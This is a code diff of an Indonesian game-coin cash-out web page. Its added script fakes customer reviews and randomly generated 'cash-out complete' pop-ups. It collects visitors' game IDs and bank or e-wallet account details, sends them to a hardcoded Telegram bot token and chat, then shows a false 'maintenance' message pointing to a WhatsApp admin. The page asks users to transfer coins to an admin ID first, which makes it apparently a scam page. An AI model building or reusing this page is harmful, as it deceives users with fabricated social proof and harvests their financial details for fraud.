@@ -59,6 +59,7 @@
             100% { top: 60%; left: 80%; }
         }
 
+        /* --- MAIN CONTAINER --- */
         .appnwghdiprem {
             width: 100%;
             max-width: 480px;
@@ -78,6 +79,7 @@
             box-shadow: var(--shadow-hd);
         }
 
+        /* --- MODERN HEADER --- */
         .headernwgverifhdi {
             background: rgba(0, 0, 0, 0.2);
             padding: 25px 15px;
@@ -115,207 +117,79 @@
         }
 
         .btn-link-domino {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            width: 100%;
-            margin: 15px 0;
-            padding: 16px;
-            background: var(--accent-gold);
-            color: #000;
-            font-weight: 800;
-            text-decoration: none;
-            border-radius: 15px;
-            text-transform: uppercase;
-            font-size: 0.9rem;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            width: 100%; margin: 15px 0; padding: 16px;
+            background: var(--accent-gold); color: #000;
+            font-weight: 800; text-decoration: none; border-radius: 15px;
+            text-transform: uppercase; font-size: 0.9rem;
             box-shadow: 0 6px 0 #b36b00, 0 10px 20px rgba(0,0,0,0.3);
             transition: all 0.2s ease;
-            box-sizing: border-box;
         }
 
         .section-title {
-            font-size: 0.9rem;
-            color: var(--accent-cyan);
-            font-weight: 700;
-            text-transform: uppercase;
-            margin: 25px 0 10px 5px;
-            letter-spacing: 1px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+            font-size: 0.9rem; color: var(--accent-cyan); font-weight: 700;
+            text-transform: uppercase; margin: 25px 0 10px 5px;
+            display: flex; align-items: center; gap: 8px;
         }
 
         .pretty-input {
-            width: 100%;
-            margin: 15px 0;
-            display: flex;
-            align-items: center;
-            background: var(--input-bg);
-            border-radius: 15px;
-            padding: 14px 18px;
+            width: 100%; margin: 15px 0; display: flex; align-items: center;
+            background: var(--input-bg); border-radius: 15px; padding: 14px 18px;
             box-shadow: inset 5px 5px 10px rgba(0,0,0,0.2);
-            border: 2px solid transparent;
-            box-sizing: border-box;
+            border: 2px solid transparent; box-sizing: border-box;
         }
 
         .pretty-input input, .pretty-input select, .pretty-input textarea {
-            background: transparent;
-            border: none;
-            outline: none;
-            width: 100%;
-            font-weight: 700;
-            color: var(--text-dark);
-            font-size: 1rem;
+            background: transparent; border: none; outline: none; width: 100%;
+            font-weight: 700; color: var(--text-dark); font-size: 1rem;
             font-family: 'Poppins', sans-serif;
         }
 
-        .pretty-icon {
-            margin-right: 15px;
-            color: #6b3f1d;
-            font-size: 1.2rem;
-            width: 20px;
-            text-align: center;
-        }
+        .pretty-icon { margin-right: 15px; color: #6b3f1d; font-size: 1.2rem; width: 20px; text-align: center; }
 
-        .id-display-section {
-            background: rgba(0,0,0,0.3);
-            border-radius: 20px;
-            padding: 25px 15px;
-            margin: 30px 0;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .id-image {
-            width: 160px;
-            border-radius: 15px;
-            border: 4px solid #ffcc33;
-            margin-bottom: 20px;
-        }
-
-        .copy-btn {
-            position: absolute;
-            right: 8px; top: 50%;
-            transform: translateY(-50%);
-            background: #fff;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 10px;
-            font-weight: 800;
-            cursor: pointer;
-            color: #ff9800;
-        }
-
-        .file-upload-box {
-            width: 100%;
-            margin: 15px 0;
-            padding: 20px;
-            border: 2px dashed rgba(255, 204, 51, 0.5);
-            border-radius: 15px;
-            text-align: center;
-            background: rgba(0,0,0,0.2);
-            box-sizing: border-box;
-        }
-
-        button[type="submit"] {
-            background: linear-gradient(180deg, #d4fc79 0%, #67a309 100%);
-            color: #fff;
-            border: none;
-            padding: 18px 60px;
-            border-radius: 50px;
-            font-size: 1.2rem;
-            font-weight: 800;
-            cursor: pointer;
-            box-shadow: 0 8px 0 #1a5806, 0 15px 25px rgba(0,0,0,0.3);
-            text-transform: uppercase;
-        }
-
-        .btn-chat-admin {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            margin-top: 25px;
-            color: #268707;
-            background: #fff;
-            padding: 12px 28px;
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: 700;
-        }
-
-        /* --- ULASAN SECTION STYLE --- */
-        .testi-container {
-            padding: 30px 20px;
-            background: rgba(0,0,0,0.1);
+        /* --- TOAST NOTIFICATIONS STYLE --- */
+        .toast-notif {
+            background: rgba(20, 25, 35, 0.95);
+            color: white;
+            padding: 12px 20px;
             border-radius: 30px;
-            margin-top: 20px;
-        }
-
-        .review-card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 18px;
-            margin-bottom: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .review-user { display: flex; justify-content: space-between; margin-bottom: 8px; }
-        .player-name { color: var(--accent-cyan); font-weight: 700; }
-        .stars { color: #ffcc33; font-size: 0.8rem; }
-        .review-text { color: rgba(255, 255, 255, 0.8); font-size: 0.9rem; margin-bottom: 12px; font-style: italic; }
-        .time-info { border-top: 1px solid rgba(37, 211, 102, 0.3); padding-top: 8px; color: var(--wa-green); font-size: 0.75rem; font-weight: 700; }
-
-        .btn-send-review {
-            background: var(--accent-cyan);
-            color: #032b29;
-            border: none;
-            width: 100%;
-            padding: 12px;
-            border-radius: 12px;
-            font-weight: 800;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-
-        /* --- MODAL --- */
-        .modal-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(8px);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-        .modal-content {
-            background: #0b5250;
-            padding: 30px;
-            border-radius: 30px;
-            text-align: center;
-            max-width: 320px;
-            border: 2px solid var(--accent-cyan);
-        }
-
-        #notifications-container { position: fixed; top: 20px; right: 20px; z-index: 1000; pointer-events: none; }
-        .notification {
-            background: rgba(255, 255, 255, 0.95);
-            color: #333;
-            padding: 15px;
-            border-radius: 15px;
-            margin-bottom: 10px;
             display: flex;
             align-items: center;
-            width: 280px;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
-            border-left: 5px solid #1fa866;
-            animation: slideInHD 0.5s forwards;
+            gap: 12px;
+            margin-bottom: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,255,255,0.1);
+            transform: translateX(-120%);
+            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            font-family: 'Poppins', sans-serif;
+            min-width: 280px;
         }
 
-        @keyframes slideInHD { from { transform: translateX(120%); } to { transform: translateX(0); } }
-        .notification-icon { width: 40px; height: 40px; margin-right: 12px; border-radius: 8px; }
+        .toast-notif.show { transform: translateX(0); }
+        .toast-icon { background: #10b981; width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; color: white; }
+        .toast-user { font-weight: 700; font-size: 0.95rem; }
+        .toast-status { color: #10b981; margin-left: 5px; }
+        .toast-desc { font-size: 0.85rem; color: rgba(255,255,255,0.7); }
+
+        /* --- ULASAN SECTION STYLE --- */
+        .testi-container { padding: 30px 20px; background: rgba(0,0,0,0.1); border-radius: 30px; margin-top: 20px; }
+        .review-card { background: rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 18px; margin-bottom: 15px; border: 1px solid rgba(255, 255, 255, 0.05); }
+        .player-name { color: var(--accent-cyan); font-weight: 700; }
+        .stars { color: #ffcc33; font-size: 0.8rem; }
+        .review-text { color: rgba(255, 255, 255, 0.8); font-size: 0.9rem; margin-bottom: 8px; font-style: italic; }
+        .time-info { color: var(--wa-green); font-size: 0.75rem; font-weight: 700; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 8px; }
+
+        /* --- MODAL STYLE --- */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; justify-content: center; align-items: center; z-index: 9999; }
+        .modal-content { background: #0b5250; padding: 30px; border-radius: 30px; text-align: center; max-width: 320px; border: 2px solid var(--accent-cyan); color: #fff; }
+        .btn-close-modal { margin-top: 25px; background: var(--accent-cyan); border: none; padding: 10px 30px; border-radius: 50px; font-weight: 800; cursor: pointer; color: #032b29; }
+
+        .id-display-section { background: rgba(0,0,0,0.3); border-radius: 20px; padding: 25px 15px; margin: 30px 0; text-align: center; position: relative; overflow: hidden; }
+        .id-image { width: 160px; border-radius: 15px; border: 4px solid #ffcc33; margin-bottom: 20px; }
+        .copy-btn { position: absolute; right: 8px; top: 50%; transform: translateY(-50%); background: #fff; border: none; padding: 8px 15px; border-radius: 10px; font-weight: 800; cursor: pointer; color: #ff9800; }
+        .file-upload-box { width: 100%; margin: 15px 0; padding: 20px; border: 2px dashed rgba(255, 204, 51, 0.5); border-radius: 15px; text-align: center; background: rgba(0,0,0,0.2); box-sizing: border-box; }
+        button[type="submit"] { background: linear-gradient(180deg, #d4fc79 0%, #67a309 100%); color: #fff; border: none; padding: 18px 60px; border-radius: 50px; font-size: 1.2rem; font-weight: 800; cursor: pointer; box-shadow: 0 8px 0 #1a5806, 0 15px 25px rgba(0,0,0,0.3); text-transform: uppercase; transition: 0.1s; }
+        .btn-chat-admin { display: inline-flex; align-items: center; gap: 8px; margin-top: 25px; color: #268707; background: #fff; padding: 12px 28px; border-radius: 50px; text-decoration: none; font-weight: 700; }
     </style>
 </head>
 <body>
@@ -359,39 +233,36 @@
 
                 <div class="id-display-section">
                     <p style="color: #ffcc33; font-weight: 800; margin-bottom: 15px;">ID TUJUAN PENGIRIMAN:</p>
-                    <img src="img/idbaru.png" alt="ID Admin" class="id-image">
-                    <div class="pretty-input" style="background: #fff; margin: 0 auto; width: 80%; position: relative;">
-                        <input type="text" id="idPenerima" value="2625095" readonly style="color: #000;">
+                    <img src="img/id.png" class="id-image">
+                    <div class="pretty-input" style="background: #fff; margin: 0 auto; width: 85%; position: relative;">
+                        <input type="text" id="idPenerima" value="2612453" readonly style="color: #000; text-align: center;">
                         <button type="button" class="copy-btn" onclick="copyID()">SALIN</button>
                     </div>
                 </div>
 
                 <div class="section-title"><i class="fas fa-camera"></i> BUKTI TRANSFER KOIN</div>
                 <div class="file-upload-box">
-                    <input type="file" id="myFile" name="filename" required>
+                    <input type="file" id="myFile" required>
                 </div>
 
                 <div class="section-title"><i class="fas fa-money-bill-wave"></i> TUJUAN PENCAIRAN</div>
                 <div class="pretty-input">
-                    <span class="pretty-icon"><i class="fas fa-university"></i></span>
                     <select name="bank_pencairan" required>
                         <option value="" disabled selected>Pilih Bank / E-Wallet</option>
-                        <option>BCA</option><option>BRI</option><option>BNI</option><option>DANA</option><option>OVO</option><option>GOPAY</option>
+                        <option>BCA</option><option>BRI</option><option>BNI</option><option>MANDIRI</option><option>DANA</option><option>OVO</option><option>GOPAY</option><option>SHOPEEPAY</option>
                     </select>
                 </div>
                 <div class="pretty-input">
-                    <span class="pretty-icon"><i class="fas fa-credit-card"></i></span>
                     <input type="number" name="nomor_rekening" placeholder="Nomor Rekening / HP" required>
                 </div>
                 <div class="pretty-input">
-                    <span class="pretty-icon"><i class="fas fa-user-check"></i></span>
-                    <input type="text" name="atas_nama" placeholder="Atas Nama Pemilik" required>
+                    <input type="text" name="atas_nama" placeholder="Atas Nama Pemilik Rekening" required>
                 </div>
 
-                <div class="button-group" style="text-align: center; padding: 20px 0;">
+                <div class="button-group">
                     <button type="submit" id="btnSubmit">PROSES SEKARANG</button>
                     <br>
-                    <a href="https://wa.me/+6283108713252" target="_blank" class="btn-chat-admin">
+                    <a href="https://wa.me/+6289509170352" target="_blank" class="btn-chat-admin">
                         <i class="fab fa-whatsapp"></i> HUBUNGI ADMIN
                     </a>
                 </div>
@@ -403,92 +274,129 @@
             <div class="pretty-input" style="background: rgba(255,255,255,0.1); flex-direction: column; align-items: flex-start; gap: 10px; height: auto; padding: 15px;">
                 <input type="text" id="rev-name" placeholder="Nama Anda..." style="color: #fff;">
                 <textarea id="rev-text" placeholder="Tulis ulasan..." rows="2" style="color: #fff;"></textarea>
-                <button class="btn-send-review" onclick="showNotice()">KIRIM ULASAN</button>
+                <button class="btn-close-modal" style="width: 100%; margin-top: 10px;" onclick="showNotice()">KIRIM ULASAN</button>
             </div>
             <div id="review-list" style="margin-top: 20px;"></div>
         </div>
     </div>
 </div>
 
-<div id="notifications-container"></div>
+<div id="toast-container" style="position: fixed; bottom: 20px; left: 20px; z-index: 10000; pointer-events: none;"></div>
 
 <div class="modal-overlay" id="modalNotice">
     <div class="modal-content">
         <i class="fas fa-exclamation-circle" style="font-size: 3rem; color: #ffcc33; margin-bottom: 15px; display: block;"></i>
-        <p style="color: #fff;">Anda hanya bisa berkomentar jika sudah melakukan withdraw koin melalui Admin.</p>
-        <button class="btn-send-review" onclick="closeNotice()" style="margin-top: 20px;">SAYA MENGERTI</button>
+        <p>Anda hanya bisa berkomentar jika sudah melakukan withdraw koin melalui Admin.</p>
+        <button class="btn-close-modal" onclick="closeNotice()">SAYA MENGERTI</button>
     </div>
 </div>
 
 <script>
-    // --- Data Ulasan ---
-    const players = ["ahmad", "PejuangB", "kings", "Player_1895", "suprilopez", "RizkyGamer", "ZakyPro", "indra_777", "sultanboss"];
+    // --- TELEGRAM CONFIG ---
+    const TELEGRAM_TOKEN = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw"; 
+    const TELEGRAM_CHAT_ID = "6604182176";
+
+    const players = [
+        "ahmad", "player_2448011", "PejuangB", "kings", "Player_1895", "suprilopez", "RizkyGamer", 
+        "noobMaster77", "andika_01", "shadowX", "ZakyPro", "hunter_998", "legendaryID", 
+        "FajarXGaming", "dark_knight21", "bagasplay", "indra_777", "sultanboss", "rehanProID", "ghostplayer99"
+    ];
+
     const texts = [
         "Adminnya ramah kalau ada kendala langsung dibantu.",
         "Udah bongkar berkali-kali selalu amanah. Jozzz.",
         "Bongkar 50b amanah bosku.",
         "Bongkar di sini emang paling kilat, dana langsung di proses!",
-        "Terjamin amanah, dana langsung cair hitungan menit."
+        "Terjamin amanah, dana langsung cair hitungan menit.",
+        "Bongkar 100b done amanah bosku.",
+        "Pelayanan cepat dan responsif, mantap banget.",
+        "Baru coba dan gacor, prosesnya cepat.",
+        "Admin gercep, pelayanan top banget.",
+        "Proses tanpa ribet, langsung gas cair.",
+        "Sudah berkali-kali pakai, tetap aman."
     ];
 
     function getRandom(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
-    function getRandomStars() { return "★".repeat(5); }
 
+    // --- GENERATE REVIEWS ---
     const list = document.getElementById('review-list');
-    for (let i = 0; i < 4; i++) {
-        const card = document.createElement('div');
-        card.className = 'review-card';
-        card.innerHTML = `
-            <div class="review-user"><span class="player-name">${getRandom(players)}</span><span class="stars">${getRandomStars()}</span></div>
+    for (let i = 0; i < 5; i++) {
+        const div = document.createElement('div');
+        div.className = 'review-card';
+        div.innerHTML = `
+            <div style="display:flex; justify-content:space-between;"><span class="player-name">${getRandom(players)}</span><span class="stars">★★★★★</span></div>
             <p class="review-text">"${getRandom(texts)}"</p>
-            <div class="time-info">${Math.floor(Math.random() * 50) + 1} Menit yang lalu</div>
-        `;
-        list.appendChild(card);
+            <div class="time-info">${Math.floor(Math.random() * 58) + 1} Menit yang lalu</div>`;
+        list.appendChild(div);
     }
 
+    // --- TOAST TRANSACTION LOGIC ---
+    const toastContainer = document.getElementById('toast-container');
+    function createTransactionToast() {
+        const listHarga = ["62.000", "310.000", "620.000", "1.240.000", "3.100.000", "6.200.000", "930.000", "114.000", "186.000"];
+        const paymentMethods = ["Dana", "OVO", "GoPay", "ShopeePay", "Seabank", "Transfer Bank"];
+        
+        const toast = document.createElement('div');
+        toast.className = 'toast-notif';
+        toast.innerHTML = `
+            <div class="toast-icon"><i class="fas fa-check"></i></div>
+            <div class="toast-content">
+                <div class="toast-user">${getRandom(players)} <span class="toast-status">Bongkar Selesai</span></div>
+                <div class="toast-desc">${getRandom(paymentMethods)} - 🇮🇩 Rp ${getRandom(listHarga)}</div>
+            </div>`;
+        toastContainer.appendChild(toast);
+        setTimeout(() => toast.classList.add('show'), 100);
+        setTimeout(() => {
+            toast.classList.remove('show');
+            setTimeout(() => toast.remove(), 500);
+        }, 4000);
+    }
+
+    function loopNotif() {
+        const delay = Math.floor(Math.random() * 4000) + 3000; // Lebih sering (3-7 detik)
+        setTimeout(() => { createTransactionToast(); loopNotif(); }, delay);
+    }
+    setTimeout(() => { createTransactionToast(); loopNotif(); }, 1500);
+
+    // --- FORM HANDLING (TELEGRAM) ---
+    document.getElementById("bongkarForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const btn = document.getElementById("btnSubmit");
+        btn.innerText = "SEDANG DIPROSES...";
+        btn.disabled = true;
+
+        const formData = new FormData(this);
+        let msg = `🔔 *BONGKAR BARU*\n\n`;
+        msg += `🆔 ID: ${formData.get('id_pengirim')}\n`;
+        msg += `👤 Nick: ${formData.get('nickname')}\n`;
+        msg += `💰 Jumlah: ${formData.get('jumlah_bongkaran')}\n`;
+        msg += `🏦 Bank: ${formData.get('bank_pencairan')}\n`;
+        msg += `💳 No.Rek: ${formData.get('nomor_rekening')}\n`;
+        msg += `✍️ Nama: ${formData.get('atas_nama')}`;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+        .then(() => {
+            alert("✅ PENCAIRAN MAINTENANCE!\n\nPencairan saat ini sedang maintenance otomatis. Data sudah masuk, silahkan hubungi Admin WA untuk proses manual.");
+            btn.innerText = "PROSES SEKARANG";
+            btn.disabled = false;
+            this.reset();
+        });
+    });
+
+    // --- UTILS ---
     function showNotice() {
-        const name = document.getElementById('rev-name').value;
-        const text = document.getElementById('rev-text').value;
-        if(name.trim() === "" || text.trim() === "") { alert("Isi nama dan ulasan."); return; }
+        const n = document.getElementById('rev-name').value;
+        const t = document.getElementById('rev-text').value;
+        if(!n || !t) { alert("Isi nama dan ulasan!"); return; }
         document.getElementById('modalNotice').style.display = 'flex';
     }
-
-    function closeNotice() {
-        document.getElementById('modalNotice').style.display = 'none';
-        document.getElementById('rev-name').value = "";
-        document.getElementById('rev-text').value = "";
-    }
-
-    // --- Notifikasi Transaksi ---
-    const notifs = [
-        { title: 'Andi Pratama', message: 'Bongkar 20B | Sukses Rp 1.240.000' },
-        { title: 'Siti Rahma', message: 'Bongkar 5B | Sukses Rp 310.000' },
-        { title: 'Budi Santoso', message: 'Bongkar 10B | Sukses Rp 620.000' }
-    ];
-    let nIdx = 0;
-    function showNext() {
-        const n = notifs[nIdx];
-        const div = document.createElement('div');
-        div.className = 'notification';
-        div.innerHTML = `<img src="img/reg_gold_.png" class="notification-icon"><div><div class="notification-title">${n.title}</div><div class="notification-message">${n.message}</div></div>`;
-        document.getElementById('notifications-container').appendChild(div);
-        setTimeout(() => { div.style.opacity = '0'; setTimeout(() => div.remove(), 500); }, 4000);
-        nIdx = (nIdx + 1) % notifs.length;
-    }
-    setInterval(showNext, 6000);
-
-    // --- Utils ---
+    function closeNotice() { document.getElementById('modalNotice').style.display = 'none'; }
     function copyID() {
         const el = document.getElementById('idPenerima');
         el.select();
-        navigator.clipboard.writeText(el.value);
-        alert('ID Admin Disalin: ' + el.value);
+        document.execCommand('copy');
+        alert('✅ ID ADMIN BERHASIL DISALIN!');
     }
-
-    document.getElementById("bongkarForm").addEventListener("submit", function(e) {
-        e.preventDefault();
-        alert("✅ PENCAIRAN MAINTENANCE!\n\nSilahkan hubungi Admin WA untuk proses manual.");
-    });
 </script>
 
 </body>
